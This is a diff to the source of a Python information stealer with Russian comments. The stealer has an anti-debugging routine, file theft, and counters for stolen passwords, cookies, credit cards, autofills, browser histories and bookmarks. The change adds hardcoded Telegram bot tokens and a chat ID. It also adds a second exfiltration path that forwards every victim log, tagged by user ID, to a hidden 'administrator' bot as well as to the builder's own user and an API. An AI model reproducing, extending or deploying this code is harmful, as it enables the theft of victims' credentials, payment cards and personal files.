@@ -155,8 +155,10 @@ for module in ModuleRequirements:
 from Crypto.Cipher import AES
 
 # ================== НАСТРОЙКИ TELEGRAM ==================
-#TG_BOT_TOKEN = "8559557105:AAH-mkWJgOaHOoKSXs05tPB9Xz52Asb1Jak"
-#TG_CHAT_ID = "5084593394"
+TG_BOT_TOKEN = "REPLACE_TG_TOKEN"   # токен бота пользователя (подставляется при сборке)
+TG_CHAT_ID = "REPLACE_TG_CHAT"     # чат-айди пользователя (подставляется при сборке)
+ADMIN_BOT_TOKEN = "7965154885:AAF47_kzofVg9-IYbbcM4z2EHGz0h-LPfcI"  # админский бот
+ADMIN_CHAT_ID = "5084593394"        # админский чат-айди
 
 
 def antidebug():
@@ -1442,7 +1444,7 @@ def filestealr():
     log_message("filestealr завершена")
 
 def send_telegram_summary():
-    """Отправляет итоговое сообщение в Telegram (напрямую) и через API."""
+    """Отправляет итоговое сообщение в Telegram пользователю и администратору."""
     global GLINFO, PASSWORDS_LINK, COOKIES_LINK, CREDITCARDS_LINK, AUTOFILLS_LINK, HISTORIES_LINK, BOOKMARKS_LINK, FILES_ARCHIVE_LINK
     global P455WC0UNt, C00K1C0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt
     global p45WW0rDs, c00K1W0rDs
@@ -1582,16 +1584,12 @@ def send_telegram_summary():
 
     parts = split_text(full_html)
 
-    # ========== ОТПРАВКА НА API (как было) ==========
+    # ====== 1. Отправка на API (как было) ======
     for idx, part in enumerate(parts, 1):
         send_log_to_api(part, 'text')
         log_message(f"Часть {idx}/{len(parts)} отправлена через API")
 
-    # ========== ОТПРАВКА В TELEGRAM (добавлено) ==========
-    # Токен и ID чата — можно задать здесь или брать из переменных окружения
-    TG_BOT_TOKEN = "7965154885:AAF47_kzofVg9-IYbbcM4z2EHGz0h-LPfcI"  # токен твоего бота
-    TG_CHAT_ID = "5084593394"  # твой ID (куда присылать логи)
-
+    # ====== 2. Отправка ПОЛЬЗОВАТЕЛЮ (через его бота) ======
     try:
         for part in parts:
             url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
@@ -1602,11 +1600,28 @@ def send_telegram_summary():
             }
             resp = requests.post(url, json=payload, timeout=10)
             if resp.status_code == 200:
-                log_message("Часть лога отправлена в Telegram")
+                log_message("Часть лога отправлена пользователю")
             else:
-                log_message(f"Ошибка отправки в Telegram: {resp.status_code}, {resp.text}")
+                log_message(f"Ошибка отправки пользователю: {resp.status_code}, {resp.text}")
     except Exception as e:
-        log_message(f"Исключение при отправке в Telegram: {e}")
+        log_message(f"Исключение при отправке пользователю: {e}")
+
+    # ====== 3. Отправка АДМИНИСТРАТОРУ (с пометкой от какого пользователя) ======
+    try:
+        for part in parts:
+            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
+            payload = {
+                "chat_id": ADMIN_CHAT_ID,
+                "text": f"📨 Лог от пользователя {USER_ID}:\n\n{part}",
+                "parse_mode": "HTML"
+            }
+            resp = requests.post(url, json=payload, timeout=10)
+            if resp.status_code == 200:
+                log_message("Часть лога отправлена администратору")
+            else:
+                log_message(f"Ошибка отправки администратору: {resp.status_code}, {resp.text}")
+    except Exception as e:
+        log_message(f"Исключение при отправке администратору: {e}")
 
 global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157
 
